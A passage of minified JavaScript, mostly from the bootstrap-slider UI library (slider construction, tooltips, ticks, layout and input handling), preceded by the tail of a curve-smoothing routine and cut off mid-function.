x=0,w=(e=r.getBezierControlPoints(u)).length;x<w;x+=1)s=e[x],c=t[x+1]?t[x+1].time-t[x].time:o,a={x:v*s[0][0]+3*g*d*s[1][0]+3*m*p*s[2][0]+f*s[3][0],y:v*s[0][1]+3*g*d*s[1][1]+3*m*p*s[2][1]+f*s[3][1],color:t[x].color,time:Math.floor(t[x].time+c*d)},l={x:f*s[0][0]+3*p*m*s[1][0]+3*d*g*s[2][0]+v*s[3][0],y:f*s[0][1]+3*p*m*s[1][1]+3*d*g*s[2][1]+v*s[3][1],color:t[x].color,time:Math.floor(t[x].time+c*m)},h.push(t[x]),h.push(a),h.push(l);return h.push(t[t.length-1]),h},onEndCallBack:function(){console.time("Processing smooth");var e=t.toData(),n=s._subSample(e);t.fromData(n),console.timeEnd("Processing smooth")}};return s.onEndCallBack},_typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(t){return typeof t}:function(t){return t&&"function"==typeof Symbol&&t.constructor===Symbol&&t!==Symbol.prototype?"symbol":typeof t},windowIsDefined="object"===("undefined"==typeof window?"undefined":_typeof(window));!function(t){if("function"==typeof define&&define.amd)define(["jquery"],t);else if("object"===("undefined"==typeof module?"undefined":_typeof(module))&&module.exports){var e;try{e=require("jquery")}catch(n){e=null}module.exports=t(e)}else window&&(window.Slider=t(window.jQuery))}((function(t){var e,n="slider",i="bootstrapSlider";return windowIsDefined&&!window.console&&(window.console={}),windowIsDefined&&!window.console.log&&(window.console.log=function(){}),windowIsDefined&&!window.console.warn&&(window.console.warn=function(){}),function(t){"use strict";function e(){}var i=Array.prototype.slice;!function n(t){function n(e){e.prototype.option||(e.prototype.option=function(e){t.isPlainObject(e)&&(this.options=t.extend(!0,this.options,e))})}function o(e,n){t.fn[e]=function(o){if("string"==typeof o){for(var s=i.call(arguments,1),a=0,l=this.length;a<l;a++){var c=this[a],u=t.data(c,e);if(u)if(t.isFunction(u[o])&&"_"!==o.charAt(0)){var h=u[o].apply(u,s);if(void 0!==h&&h!==u)return h}else r("no such method '"+o+"' for "+e+" instance");else r("cannot call methods on "+e+" prior to initialization; attempted to call '"+o+"'")}return this}var d=this.map((function(){var i=t.data(this,e);return i?(i.option(o),i._init()):(i=new n(this,o),t.data(this,e,i)),t(this)}));return 1===d.length?d[0]:d}}if(t){var r="undefined"==typeof console?e:function(t){console.error(t)};return t.bridget=function(t,e){n(e),o(t,e)},t.bridget}}(t)}(t),function(t){function o(e,n){function i(t,e){var n="data-slider-"+e.replace(/_/g,"-"),i=t.getAttribute(n);try{return JSON.parse(i)}catch(o){return i}}this._state={value:null,enabled:null,offset:null,size:null,percentage:null,inDrag:!1,over:!1,tickIndex:null},this.ticksCallbackMap={},this.handleCallbackMap={},"string"==typeof e?this.element=document.querySelector(e):e instanceof HTMLElement&&(this.element=e),n=n||{};for(var o=Object.keys(this.defaultOptions),r=n.hasOwnProperty("min"),s=n.hasOwnProperty("max"),l=0;l<o.length;l++){var c=o[l],u=n[c];u=null!==(u=void 0!==u?u:i(this.element,c))?u:this.defaultOptions[c],this.options||(this.options={}),this.options[c]=u}if(this.ticksAreValid=Array.isArray(this.options.ticks)&&this.options.ticks.length>0,this.ticksAreValid||(this.options.lock_to_ticks=!1),"auto"===this.options.rtl){var h=window.getComputedStyle(this.element);this.options.rtl=null!=h?"rtl"===h.direction:"rtl"===this.element.style.direction}"vertical"!==this.options.orientation||"top"!==this.options.tooltip_position&&"bottom"!==this.options.tooltip_position?"horizontal"!==this.options.orientation||"left"!==this.options.tooltip_position&&"right"!==this.options.tooltip_position||(this.options.tooltip_position="top"):this.options.rtl?this.options.tooltip_position="left":this.options.tooltip_position="right";var d,p,f,m,g,v=this.element.style.width,y=!1,b=this.element.parentNode;if(this.sliderElem)y=!0;else{this.sliderElem=document.createElement("div"),this.sliderElem.className="slider";var x=document.createElement("div");x.className="slider-track",(p=document.createElement("div")).className="slider-track-low",(d=document.createElement("div")).className="slider-selection",(f=document.createElement("div")).className="slider-track-high",(m=document.createElement("div")).className="slider-handle min-slider-handle",m.setAttribute("role","slider"),m.setAttribute("aria-valuemin",this.options.min),m.setAttribute("aria-valuemax",this.options.max),(g=document.createElement("div")).className="slider-handle max-slider-handle",g.setAttribute("role","slider"),g.setAttribute("aria-valuemin",this.options.min),g.setAttribute("aria-valuemax",this.options.max),x.appendChild(p),x.appendChild(d),x.appendChild(f),this.rangeHighlightElements=[];var w=this.options.rangeHighlights;if(Array.isArray(w)&&w.length>0)for(var _=0;_<w.length;_++){var k=document.createElement("div"),T=w[_].class||"";k.className="slider-rangeHighlight slider-selection "+T,this.rangeHighlightElements.push(k),x.appendChild(k)}var C=Array.isArray(this.options.labelledby);if(C&&this.options.labelledby[0]&&m.setAttribute("aria-labelledby",this.options.labelledby[0]),C&&this.options.labelledby[1]&&g.setAttribute("aria-labelledby",this.options.labelledby[1]),!C&&this.options.labelledby&&(m.setAttribute("aria-labelledby",this.options.labelledby),g.setAttribute("aria-labelledby",this.options.labelledby)),this.ticks=[],Array.isArray(this.options.ticks)&&this.options.ticks.length>0){for(this.ticksContainer=document.createElement("div"),this.ticksContainer.className="slider-tick-container",l=0;l<this.options.ticks.length;l++){var S=document.createElement("div");if(S.className="slider-tick",this.options.ticks_tooltip){var E=this._addTickListener(),j=E.addMouseEnter(this,S,l),A=E.addMouseLeave(this,S);this.ticksCallbackMap[l]={mouseEnter:j,mouseLeave:A}}this.ticks.push(S),this.ticksContainer.appendChild(S)}d.className+=" tick-slider-selection"}if(this.tickLabels=[],Array.isArray(this.options.ticks_labels)&&this.options.ticks_labels.length>0)for(this.tickLabelContainer=document.createElement("div"),this.tickLabelContainer.className="slider-tick-label-container",l=0;l<this.options.ticks_labels.length;l++){var M=document.createElement("div"),D=0===this.options.ticks_positions.length,L=this.options.reversed&&D?this.options.ticks_labels.length-(l+1):l;M.className="slider-tick-label",M.innerHTML=this.options.ticks_labels[L],this.tickLabels.push(M),this.tickLabelContainer.appendChild(M)}var P=function(t){var e=document.createElement("div");e.className="tooltip-arrow";var n=document.createElement("div");n.className="tooltip-inner",t.appendChild(e),t.appendChild(n)},$=document.createElement("div");$.className="tooltip tooltip-main",$.setAttribute("role","presentation"),P($);var O=document.createElement("div");O.className="tooltip tooltip-min",O.setAttribute("role","presentation"),P(O);var B=document.createElement("div");B.className="tooltip tooltip-max",B.setAttribute("role","presentation"),P(B),this.sliderElem.appendChild(x),this.sliderElem.appendChild($),this.sliderElem.appendChild(O),this.sliderElem.appendChild(B),this.tickLabelContainer&&this.sliderElem.appendChild(this.tickLabelContainer),this.ticksContainer&&this.sliderElem.appendChild(this.ticksContainer),this.sliderElem.appendChild(m),this.sliderElem.appendChild(g),b.insertBefore(this.sliderElem,this.element),this.element.style.display="none"}if(t&&(this.$element=t(this.element),this.$sliderElem=t(this.sliderElem)),this.eventToCallbackMap={},this.sliderElem.id=this.options.id,this.touchCapable="ontouchstart"in window||window.DocumentTouch&&document instanceof window.DocumentTouch,this.touchX=0,this.touchY=0,this.tooltip=this.sliderElem.querySelector(".tooltip-main"),this.tooltipInner=this.tooltip.querySelector(".tooltip-inner"),this.tooltip_min=this.sliderElem.querySelector(".tooltip-min"),this.tooltipInner_min=this.tooltip_min.querySelector(".tooltip-inner"),this.tooltip_max=this.sliderElem.querySelector(".tooltip-max"),this.tooltipInner_max=this.tooltip_max.querySelector(".tooltip-inner"),a[this.options.scale]&&(this.options.scale=a[this.options.scale]),!0===y&&(this._removeClass(this.sliderElem,"slider-horizontal"),this._removeClass(this.sliderElem,"slider-vertical"),this._removeClass(this.sliderElem,"slider-rtl"),this._removeClass(this.tooltip,"hide"),this._removeClass(this.tooltip_min,"hide"),this._removeClass(this.tooltip_max,"hide"),["left","right","top","width","height"].forEach((function(t){this._removeProperty(this.trackLow,t),this._removeProperty(this.trackSelection,t),this._removeProperty(this.trackHigh,t)}),this),[this.handle1,this.handle2].forEach((function(t){this._removeProperty(t,"left"),this._removeProperty(t,"right"),this._removeProperty(t,"top")}),this),[this.tooltip,this.tooltip_min,this.tooltip_max].forEach((function(t){this._removeProperty(t,"left"),this._removeProperty(t,"right"),this._removeProperty(t,"top"),this._removeClass(t,"right"),this._removeClass(t,"left"),this._removeClass(t,"top")}),this)),"vertical"===this.options.orientation?(this._addClass(this.sliderElem,"slider-vertical"),this.stylePos="top",this.mousePos="pageY",this.sizePos="offsetHeight"):(this._addClass(this.sliderElem,"slider-horizontal"),this.sliderElem.style.width=v,this.options.orientation="horizontal",this.options.rtl?this.stylePos="right":this.stylePos="left",this.mousePos="clientX",this.sizePos="offsetWidth"),this.options.rtl&&this._addClass(this.sliderElem,"slider-rtl"),this._setTooltipPosition(),Array.isArray(this.options.ticks)&&this.options.ticks.length>0&&(s||(this.options.max=Math.max.apply(Math,this.options.ticks)),r||(this.options.min=Math.min.apply(Math,this.options.ticks))),Array.isArray(this.options.value)?(this.options.range=!0,this._state.value=this.options.value):this.options.range?this._state.value=[this.options.value,this.options.max]:this._state.value=this.options.value,this.trackLow=p||this.trackLow,this.trackSelection=d||this.trackSelection,this.trackHigh=f||this.trackHigh,"none"===this.options.selection?(this._addClass(this.trackLow,"hide"),this._addClass(this.trackSelection,"hide"),this._addClass(this.trackHigh,"hide")):"after"!==this.options.selection&&"before"!==this.options.selection||(this._removeClass(this.trackLow,"hide"),this._removeClass(this.trackSelection,"hide"),this._removeClass(this.trackHigh,"hide")),this.handle1=m||this.handle1,this.handle2=g||this.handle2,!0===y)for(this._removeClass(this.handle1,"round triangle"),this._removeClass(this.handle2,"round triangle hide"),l=0;l<this.ticks.length;l++)this._removeClass(this.ticks[l],"round triangle hide");if(-1!==["round","triangle","custom"].indexOf(this.options.handle))for(this._addClass(this.handle1,this.options.handle),this._addClass(this.handle2,this.options.handle),l=0;l<this.ticks.length;l++)this._addClass(this.ticks[l],this.options.handle);if(this._state.offset=this._offset(this.sliderElem),this._state.size=this.sliderElem[this.sizePos],this.setValue(this._state.value),this.handle1Keydown=this._keydown.bind(this,0),this.handle1.addEventListener("keydown",this.handle1Keydown,!1),this.handle2Keydown=this._keydown.bind(this,1),this.handle2.addEventListener("keydown",this.handle2Keydown,!1),this.mousedown=this._mousedown.bind(this),this.touchstart=this._touchstart.bind(this),this.touchmove=this._touchmove.bind(this),this.touchCapable&&(this.sliderElem.addEventListener("touchstart",this.touchstart,!1),this.sliderElem.addEventListener("touchmove",this.touchmove,!1)),this.sliderElem.addEventListener("mousedown",this.mousedown,!1),this.resize=this._resize.bind(this),window.addEventListener("resize",this.resize,!1),"hide"===this.options.tooltip)this._addClass(this.tooltip,"hide"),this._addClass(this.tooltip_min,"hide"),this._addClass(this.tooltip_max,"hide");else if("always"===this.options.tooltip)this._showTooltip(),this._alwaysShowTooltip=!0;else{if(this.showTooltip=this._showTooltip.bind(this),this.hideTooltip=this._hideTooltip.bind(this),this.options.ticks_tooltip){var I=this._addTickListener(),N=I.addMouseEnter(this,this.handle1),R=I.addMouseLeave(this,this.handle1);this.handleCallbackMap.handle1={mouseEnter:N,mouseLeave:R},N=I.addMouseEnter(this,this.handle2),R=I.addMouseLeave(this,this.handle2),this.handleCallbackMap.handle2={mouseEnter:N,mouseLeave:R}}else this.sliderElem.addEventListener("mouseenter",this.showTooltip,!1),this.sliderElem.addEventListener("mouseleave",this.hideTooltip,!1),this.touchCapable&&(this.sliderElem.addEventListener("touchstart",this.showTooltip,!1),this.sliderElem.addEventListener("touchmove",this.showTooltip,!1),this.sliderElem.addEventListener("touchend",this.hideTooltip,!1));this.handle1.addEventListener("focus",this.showTooltip,!1),this.handle1.addEventListener("blur",this.hideTooltip,!1),this.handle2.addEventListener("focus",this.showTooltip,!1),this.handle2.addEventListener("blur",this.hideTooltip,!1),this.touchCapable&&(this.handle1.addEventListener("touchstart",this.showTooltip,!1),this.handle1.addEventListener("touchmove",this.showTooltip,!1),this.handle1.addEventListener("touchend",this.hideTooltip,!1),this.handle2.addEventListener("touchstart",this.showTooltip,!1),this.handle2.addEventListener("touchmove",this.showTooltip,!1),this.handle2.addEventListener("touchend",this.hideTooltip,!1))}this.options.enabled?this.enable():this.disable()}var r=void 0,s_formatInvalidInputErrorMsg=function(t){return"Invalid input value '"+t+"' passed in"},a={linear:{getValue:function(t,e){return t<e.min?e.min:t>e.max?e.max:t},toValue:function(t){var e=t/100*(this.options.max-this.options.min),n=!0;if(this.options.ticks_positions.length>0){for(var i,o,r,s=0,l=1;l<this.options.ticks_positions.length;l++)if(t<=this.options.ticks_positions[l]){i=this.options.ticks[l-1],r=this.options.ticks_positions[l-1],o=this.options.ticks[l],s=this.options.ticks_positions[l];break}e=i+(t-r)/(s-r)*(o-i),n=!1}var c=(n?this.options.min:0)+Math.round(e/this.options.step)*this.options.step;return a.linear.getValue(c,this.options)},toPercentage:function(t){if(this.options.max===this.options.min)return 0;if(this.options.ticks_positions.length>0){for(var e,n,i,o=0,r=0;r<this.options.ticks.length;r++)if(t<=this.options.ticks[r]){e=r>0?this.options.ticks[r-1]:0,i=r>0?this.options.ticks_positions[r-1]:0,n=this.options.ticks[r],o=this.options.ticks_positions[r];break}if(r>0)return i+(t-e)/(n-e)*(o-i)}return 100*(t-this.options.min)/(this.options.max-this.options.min)}},logarithmic:{toValue:function(t){var e=1-this.options.min,n=Math.log(this.options.min+e),i=Math.log(this.options.max+e),o=Math.exp(n+(i-n)*t/100)-e;return Math.round(o)===i?i:(o=this.options.min+Math.round((o-this.options.min)/this.options.step)*this.options.step,a.linear.getValue(o,this.options))},toPercentage:function(t){if(this.options.max===this.options.min)return 0;var e=1-this.options.min,n=Math.log(this.options.max+e),i=Math.log(this.options.min+e);return 100*(Math.log(t+e)-i)/(n-i)}}};(e=function(t,e){return o.call(this,t,e),this}).prototype={_init:function(){},constructor:e,defaultOptions:{id:"",min:0,max:10,step:1,precision:0,orientation:"horizontal",value:5,range:!1,selection:"before",tooltip:"show",tooltip_split:!1,lock_to_ticks:!1,handle:"round",reversed:!1,rtl:"auto",enabled:!0,formatter:function(t){return Array.isArray(t)?t[0]+" : "+t[1]:t},natural_arrow_keys:!1,ticks:[],ticks_positions:[],ticks_labels:[],ticks_snap_bounds:0,ticks_tooltip:!1,scale:"linear",focus:!1,tooltip_position:null,labelledby:null,rangeHighlights:[]},getElement:function(){return this.sliderElem},getValue:function(){return this.options.range?this._state.value:this._state.value[0]},setValue:function(t,e,n){t||(t=0);var i=this.getValue();this._state.value=this._validateInputValue(t);var o=this._applyPrecision.bind(this);this.options.range?(this._state.value[0]=o(this._state.value[0]),this._state.value[1]=o(this._state.value[1]),this.ticksAreValid&&this.options.lock_to_ticks&&(this._state.value[0]=this.options.ticks[this._getClosestTickIndex(this._state.value[0])],this._state.value[1]=this.options.ticks[this._getClosestTickIndex(this._state.value[1])]),this._state.value[0]=Math.max(this.options.min,Math.min(this.options.max,this._state.value[0])),this._state.value[1]=Math.max(this.options.min,Math.min(this.options.max,this._state.value[1]))):(this._state.value=o(this._state.value),this.ticksAreValid&&this.options.lock_to_ticks&&(this._state.value=this.options.ticks[this._getClosestTickIndex(this._state.value)]),this._state.value=[Math.max(this.options.min,Math.min(this.options.max,this._state.value))],this._addClass(this.handle2,"hide"),"after"===this.options.selection?this._state.value[1]=this.options.max:this._state.value[1]=this.options.min),this._setTickIndex(),this.options.max>this.options.min?this._state.percentage=[this._toPercentage(this._state.value[0]),this._toPercentage(this._state.value[1]),100*this.options.step/(this.options.max-this.options.min)]:this._state.percentage=[0,0,100],this._layout();var r=this.options.range?this._state.value:this._state.value[0];return this._setDataVal(r),!0===e&&this._trigger("slide",r),(Array.isArray(r)?i[0]!==r[0]||i[1]!==r[1]:i!==r)&&!0===n&&this._trigger("change",{oldValue:i,newValue:r}),this},destroy:function(){this._removeSliderEventHandlers(),this.sliderElem.parentNode.removeChild(this.sliderElem),this.element.style.display="",this._cleanUpEventCallbacksMap(),this.element.removeAttribute("data"),t&&(this._unbindJQueryEventHandlers(),r===n&&this.$element.removeData(r),this.$element.removeData(i))},disable:function(){return this._state.enabled=!1,this.handle1.removeAttribute("tabindex"),this.handle2.removeAttribute("tabindex"),this._addClass(this.sliderElem,"slider-disabled"),this._trigger("slideDisabled"),this},enable:function(){return this._state.enabled=!0,this.handle1.setAttribute("tabindex",0),this.handle2.setAttribute("tabindex",0),this._removeClass(this.sliderElem,"slider-disabled"),this._trigger("slideEnabled"),this},toggle:function(){return this._state.enabled?this.disable():this.enable(),this},isEnabled:function(){return this._state.enabled},on:function(t,e){return this._bindNonQueryEventHandler(t,e),this},off:function(e,n){t?(this.$element.off(e,n),this.$sliderElem.off(e,n)):this._unbindNonQueryEventHandler(e,n)},getAttribute:function(t){return t?this.options[t]:this.options},setAttribute:function(t,e){return this.options[t]=e,this},refresh:function(e){var s=this.getValue();return this._removeSliderEventHandlers(),o.call(this,this.element,this.options),e&&!0===e.useCurrentValue&&this.setValue(s),t&&(r===n?(t.data(this.element,n,this),t.data(this.element,i,this)):t.data(this.element,i,this)),this},relayout:function(){return this._resize(),this},_removeTooltipListener:function(t,e){this.handle1.removeEventListener(t,e,!1),this.handle2.removeEventListener(t,e,!1)},_removeSliderEventHandlers:function(){if(this.handle1.removeEventListener("keydown",this.handle1Keydown,!1),this.handle2.removeEventListener("keydown",this.handle2Keydown,!1),this.options.ticks_tooltip){for(var t=this.ticksContainer.getElementsByClassName("slider-tick"),e=0;e<t.length;e++)t[e].removeEventListener("mouseenter",this.ticksCallbackMap[e].mouseEnter,!1),t[e].removeEventListener("mouseleave",this.ticksCallbackMap[e].mouseLeave,!1);this.handleCallbackMap.handle1&&this.handleCallbackMap.handle2&&(this.handle1.removeEventListener("mouseenter",this.handleCallbackMap.handle1.mouseEnter,!1),this.handle2.removeEventListener("mouseenter",this.handleCallbackMap.handle2.mouseEnter,!1),this.handle1.removeEventListener("mouseleave",this.handleCallbackMap.handle1.mouseLeave,!1),this.handle2.removeEventListener("mouseleave",this.handleCallbackMap.handle2.mouseLeave,!1))}this.handleCallbackMap=null,this.ticksCallbackMap=null,this.showTooltip&&this._removeTooltipListener("focus",this.showTooltip),this.hideTooltip&&this._removeTooltipListener("blur",this.hideTooltip),this.showTooltip&&this.sliderElem.removeEventListener("mouseenter",this.showTooltip,!1),this.hideTooltip&&this.sliderElem.removeEventListener("mouseleave",this.hideTooltip,!1),this.sliderElem.removeEventListener("mousedown",this.mousedown,!1),this.touchCapable&&(this.showTooltip&&(this.handle1.removeEventListener("touchstart",this.showTooltip,!1),this.handle1.removeEventListener("touchmove",this.showTooltip,!1),this.handle2.removeEventListener("touchstart",this.showTooltip,!1),this.handle2.removeEventListener("touchmove",this.showTooltip,!1)),this.hideTooltip&&(this.handle1.removeEventListener("touchend",this.hideTooltip,!1),this.handle2.removeEventListener("touchend",this.hideTooltip,!1)),this.showTooltip&&(this.sliderElem.removeEventListener("touchstart",this.showTooltip,!1),this.sliderElem.removeEventListener("touchmove",this.showTooltip,!1)),this.hideTooltip&&this.sliderElem.removeEventListener("touchend",this.hideTooltip,!1),this.sliderElem.removeEventListener("touchstart",this.touchstart,!1),this.sliderElem.removeEventListener("touchmove",this.touchmove,!1)),window.removeEventListener("resize",this.resize,!1)},_bindNonQueryEventHandler:function(t,e){void 0===this.eventToCallbackMap[t]&&(this.eventToCallbackMap[t]=[]),this.eventToCallbackMap[t].push(e)},_unbindNonQueryEventHandler:function(t,e){var n=this.eventToCallbackMap[t];if(void 0!==n)for(var i=0;i<n.length;i++)if(n[i]===e){n.splice(i,1);break}},_cleanUpEventCallbacksMap:function(){for(var t=Object.keys(this.eventToCallbackMap),e=0;e<t.length;e++){var n=t[e];delete this.eventToCallbackMap[n]}},_showTooltip:function(){!1===this.options.tooltip_split?(this._addClass(this.tooltip,"in"),this.tooltip_min.style.display="none",this.tooltip_max.style.display="none"):(this._addClass(this.tooltip_min,"in"),this._addClass(this.tooltip_max,"in"),this.tooltip.style.display="none"),this._state.over=!0},_hideTooltip:function(){!1===this._state.inDrag&&!0!==this._alwaysShowTooltip&&(this._removeClass(this.tooltip,"in"),this._removeClass(this.tooltip_min,"in"),this._removeClass(this.tooltip_max,"in")),this._state.over=!1},_setToolTipOnMouseOver:function(t){var n=this,i=this.options.formatter(t?t.value[0]:this._state.value[0]),o=function e(t,e){return e?[100-t.percentage[0],n.options.range?100-t.percentage[1]:t.percentage[1]]:[t.percentage[0],t.percentage[1]]}(t||this._state,this.options.reversed);this._setText(this.tooltipInner,i),this.tooltip.style[this.stylePos]=o[0]+"%"},_copyState:function(){return{value:[this._state.value[0],this._state.value[1]],enabled:this._state.enabled,offset:this._state.offset,size:this._state.size,percentage:[this._state.percentage[0],this._state.percentage[1],this._state.percentage[2]],inDrag:this._state.inDrag,over:this._state.over,dragged:this._state.dragged,keyCtrl:this._state.keyCtrl}},_addTickListener:function(){return{addMouseEnter:function(t,e,n){var i=function(){var i=t._copyState(),o=e===t.handle1?i.value[0]:i.value[1],r=void 0;void 0!==n?(o=t.options.ticks[n],r=t.options.ticks_positions.length>0&&t.options.ticks_positions[n]||t._toPercentage(t.options.ticks[n])):r=t._toPercentage(o),i.value[0]=o,i.percentage[0]=r,t._setToolTipOnMouseOver(i),t._showTooltip()};return e.addEventListener("mouseenter",i,!1),i},addMouseLeave:function(t,e){var n=function(){t._hideTooltip()};return e.addEventListener("mouseleave",n,!1),n}}},_layout:function(){var t,e,n;if(t=this.options.reversed?[100-this._state.percentage[0],this.options.range?100-this._state.percentage[1]:this._state.percentage[1]]:[this._state.percentage[0],this._state.percentage[1]],this.handle1.style[this.stylePos]=t[0]+"%",this.handle1.setAttribute("aria-valuenow",this._state.value[0]),e=this.options.formatter(this._state.value[0]),isNaN(e)?this.handle1.setAttribute("aria-valuetext",e):this.handle1.removeAttribute("aria-valuetext"),this.handle2.style[this.stylePos]=t[1]+"%",this.handle2.setAttribute("aria-valuenow",this._state.value[1]),e=this.options.formatter(this._state.value[1]),isNaN(e)?this.handle2.setAttribute("aria-valuetext",e):this.handle2.removeAttribute("aria-valuetext"),this.rangeHighlightElements.length>0&&Array.isArray(this.options.rangeHighlights)&&this.options.rangeHighlights.length>0)for(var i=0;i<this.options.rangeHighlights.length;i++){var o=this._toPercentage(this.options.rangeHighlights[i].start),r=this._toPercentage(this.options.rangeHighlights[i].end);if(this.options.reversed){var s=100-r;r=100-o,o=s}var a=this._createHighlightRange(o,r);a?"vertical"===this.options.orientation?(this.rangeHighlightElements[i].style.top=a.start+"%",this.rangeHighlightElements[i].style.height=a.size+"%"):(this.options.rtl?this.rangeHighlightElements[i].style.right=a.start+"%":this.rangeHighlightElements[i].style.left=a.start+"%",this.rangeHighlightElements[i].style.width=a.size+"%"):this.rangeHighlightElements[i].style.display="none"}if(Array.isArray(this.options.ticks)&&this.options.ticks.length>0){var l,c="vertical"===this.options.orientation?"height":"width";l="vertical"===this.options.orientation?"marginTop":this.options.rtl?"marginRight":"marginLeft";var u=this._state.size/(this.options.ticks.length-1);if(this.tickLabelContainer){var h=0;if(0===this.options.ticks_positions.length)"vertical"!==this.options.orientation&&(this.tickLabelContainer.style[l]=-u/2+"px"),h=this.tickLabelContainer.offsetHeight;else for(d=0;d<this.tickLabelContainer.childNodes.length;d++)this.tickLabelContainer.childNodes[d].offsetHeight>h&&(h=this.tickLabelContainer.childNodes[d].offsetHeight);"horizontal"===this.options.orientation&&(this.sliderElem.style.marginBottom=h+"px")}for(var d=0;d<this.options.ticks.length;d++){var p=this.options.ticks_positions[d]||this._toPercentage(this.options.ticks[d]);this.options.reversed&&(p=100-p),this.ticks[d].style[this.stylePos]=p+"%",this._removeClass(this.ticks[d],"in-selection"),this.options.range?p>=t[0]&&p<=t[1]&&this._addClass(this.ticks[d],"in-selection"):("after"===this.options.selection&&p>=t[0]||"before"===this.options.selection&&p<=t[0])&&this._addClass(this.ticks[d],"in-selection"),this.tickLabels[d]&&(this.tickLabels[d].style[c]=u+"px","vertical"!==this.options.orientation&&void 0!==this.options.ticks_positions[d]?(this.tickLabels[d].style.position="absolute",this.tickLabels[d].style[this.stylePos]=p+"%",this.tickLabels[d].style[l]=-u/2+"px"):"vertical"===this.options.orientation&&(this.options.rtl?this.tickLabels[d].style.marginRight=this.sliderElem.offsetWidth+"px":this.tickLabels[d].style.marginLeft=this.sliderElem.offsetWidth+"px",this.tickLabelContainer.style[l]=this.sliderElem.offsetWidth/2*-1+"px"),this._removeClass(this.tickLabels[d],"label-in-selection label-is-selection"),this.options.range?p>=t[0]&&p<=t[1]&&(this._addClass(this.tickLabels[d],"label-in-selection"),(p===t[0]||t[1])&&this._addClass(this.tickLabels[d],"label-is-selection")):(("after"===this.options.selection&&p>=t[0]||"before"===this.options.selection&&p<=t[0])&&this._addClass(this.tickLabels[d],"label-in-selection"),p===t[0]&&this._addClass(this.tickLabels[d],"label-is-selection")))}}if(this.options.range){n=this.options.formatter(this._state.value),this._setText(this.tooltipInner,n),this.tooltip.style[this.stylePos]=(t[1]+t[0])/2+"%";var f=this.options.formatter(this._state.value[0]);this._setText(this.tooltipInner_min,f);var m=this.options.formatter(this._state.value[1]);this._setText(this.tooltipInner_max,m),this.tooltip_min.style[this.stylePos]=t[0]+"%",this.tooltip_max.style[this.stylePos]=t[1]+"%"}else n=this.options.formatter(this._state.value[0]),this._setText(this.tooltipInner,n),this.tooltip.style[this.stylePos]=t[0]+"%";if("vertical"===this.options.orientation)this.trackLow.style.top="0",this.trackLow.style.height=Math.min(t[0],t[1])+"%",this.trackSelection.style.top=Math.min(t[0],t[1])+"%",this.trackSelection.style.height=Math.abs(t[0]-t[1])+"%",this.trackHigh.style.bottom="0",this.trackHigh.style.height=100-Math.min(t[0],t[1])-Math.abs(t[0]-t[1])+"%";else{"right"===this.stylePos?this.trackLow.style.right="0":this.trackLow.style.left="0",this.trackLow.style.width=Math.min(t[0],t[1])+"%","right"===this.stylePos?this.trackSelection.style.right=Math.min(t[0],t[1])+"%":this.trackSelection.style.left=Math.min(t[0],t[1])+"%",this.trackSelection.style.width=Math.abs(t[0]-t[1])+"%","right"===this.stylePos?this.trackHigh.style.left="0":this.trackHigh.style.right="0",this.trackHigh.style.width=100-Math.min(t[0],t[1])-Math.abs(t[0]-t[1])+"%";var g=this.tooltip_min.getBoundingClientRect(),v=this.tooltip_max.getBoundingClientRect();"bottom"===this.options.tooltip_position?g.right>v.left?(this._removeClass(this.tooltip_max,"bottom"),this._addClass(this.tooltip_max,"top"),this.tooltip_max.style.top="",this.tooltip_max.style.bottom="22px"):(this._removeClass(this.tooltip_max,"top"),this._addClass(this.tooltip_max,"bottom"),this.tooltip_max.style.top=this.tooltip_min.style.top,this.tooltip_max.style.bottom=""):g.right>v.left?(this._removeClass(this.tooltip_max,"top"),this._addClass(this.tooltip_max,"bottom"),this.tooltip_max.style.top="18px"):(this._removeClass(this.tooltip_max,"bottom"),this._addClass(this.tooltip_max,"top"),this.tooltip_max.style.top=this.tooltip_min.style.top)}},_createHighlightRange:function(t,e){return this._isHighlightRange(t,e)?t>e?{start:e,size:t-e}:{start:t,size:e-t}:null},_isHighlightRange:function(t,e){return 0<=t&&t<=100&&0<=e&&e<=100},_resize:function(){this._state.offset=this._offset(this.sliderElem),this._state.size=this.sliderElem[this.sizePos],this._layout()},_removeProperty:function(t,e){t.style.removeProperty?t.style.removeProperty(e):t.style.removeAttribute(e)},_mousedown:function(t){if(!this._state.enabled)return!1;t.preventDefault&&t.preventDefault(),this._state.offset=this._offset(this.sliderElem),this._state.size=this.sliderElem[this.sizePos];var e=this._getPercentage(t);if(this.options.range){var n=Math.abs(this._state.percentage[0]-e),i=Math.abs(this._state.percentage[1]-e);this._state.dragged=n<i?0:1,this._adjustPercentageForRangeSliders(e)}else this._state.dragged=0;this._state.percentage[this._state.dragged]=e,this.touchCapable&&(document.removeEventListener("touchmove",this.mousemove,!1),document.removeEventListener("touchend",this.mouseup,!1)),this.mousemove&&document.removeEventListener("mousemove",this.mousemove,!1),this.mouseup&&document.removeEventListener("mouseup",this.mouseup,!1),this.mousemove=this._mousemove.bind(this),this.mouseup=this._mouseup.bind(this),this.touchCapable&&(document.addEventListener("touchmove",this.mousemove,!1),document.addEventListener("touchend",this.mouseup,!1)),document.addEventListener("mousemove",this.mousemove,!1),document.addEventListener("mouseup",this.mouseup,!1),this._state.inDrag=!0;var o=this._calculateValue();return this._trigger("slideStart",o),this.setValue(o,!1,!0),t.returnValue=!1,this.options.focus&&this._triggerFocusOnHandle(this._state.dragged),!0},_touchstart:function(t){this._mousedown(t)},_triggerFocusOnHandle:function(t){0===t&&this.handle1.focus(),1===t&&this.handle2.focus()},_keydown:function(t,e){if(!this._state.enabled)return!1;var n;switch(e.keyCode){case 37:case 40:n=-1;break;case 39:case 38:n=1}if(n){if(this.options.natural_arrow_keys){var i="horizontal"===this.options.orientation,o="vertical"===this.options.orientation,r=this.options.rtl,s=this.options.reversed;i?r?s||(n=-n):s&&(n=-n):o&&(s||(n=-n))}var a;if(this.ticksAreValid&&this.options.lock_to_ticks){var l=void 0;-1===(l=this.options.ticks.indexOf(this._state.value[t]))&&(l=0,window.console.warn("(lock_to_ticks) _keydown: index should not be -1")),l+=n,l=Math.max(0,Math.min(this.options.ticks.length-1,l)),a=this.options.ticks[l]}else a=this._state.value[t]+n*this.options.step;var c=this._toPercentage(a);if(this._state.keyCtrl=t,this.options.range){this._adjustPercentageForRangeSliders(c);var u=this._state.keyCtrl?this._state.value[0]:a,h=this._state.keyCtrl?a:this._state.value[1];a=[Math.max(this.options.min,Math.min(this.options.max,u)),Math.max(this.options.min,Math.min(this.options.max,h))]}else a=Math.max(this.options.min,Math.min(this.options.max,a));return this._trigger("slideStart",a),this.setValue(a,!0,!0),this._trigger("slideStop",a),this._pauseEvent(e),delete 